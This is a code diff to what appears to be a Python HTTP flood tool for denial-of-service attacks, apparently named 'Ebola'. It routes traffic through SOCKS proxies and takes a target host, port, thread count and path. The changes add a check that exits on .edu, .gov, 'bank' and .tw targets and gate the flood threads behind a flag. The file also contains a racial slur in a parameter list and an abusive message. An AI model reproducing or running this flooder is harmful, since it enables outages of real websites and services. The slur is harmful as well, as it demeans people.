@@ -37,6 +37,7 @@ attack_type = "GET"
 brute = "OFF"
 nums = 0
 suc = 0
+bp = 0
 useragents = []
 string = ["id","q","a","s","page","result","search","login","user","nigga","ebola","hiv","covid","h1n1","language","data"]
 
@@ -303,6 +304,10 @@ def flood(x):
         content = "\r"
         length = "\n"
     event.wait()
+    if bp ==1:
+        pass
+    else:
+        sys.exit()
     while 1:
         try:
             s = socks.socksocket()
@@ -335,7 +340,7 @@ def flood(x):
 
 if len(sys.argv) < 5:
     print("Usage : %s <host> <port> <threads> <path>"%(sys.argv[0]))
-    print("        --help For More Information\n")
+    print("              --help For More Information\n")
     if len(sys.argv) ==2:
         if str(sys.argv[1]) =="--help":
             print(" --install   | Auto Install Module")
@@ -375,6 +380,14 @@ elif "https://" in host:
     for _ in range((len(host)-8)):
         new_host += host[_+8]
     host = new_host
+if ".edu" in host or ".gov" in host or "bank" in host or ".tw" in host:
+    print("\n  > %s < \n"%(host))
+    print("\nThis Url Can't Be Ebola's Target\n\n")
+    print("Go Fuck Yourself Skid !")
+    sys.exit()
+else:
+    pass
+    bp = 1
 port = int(sys.argv[2])
 thr = int(sys.argv[3])
 path = str(sys.argv[4])
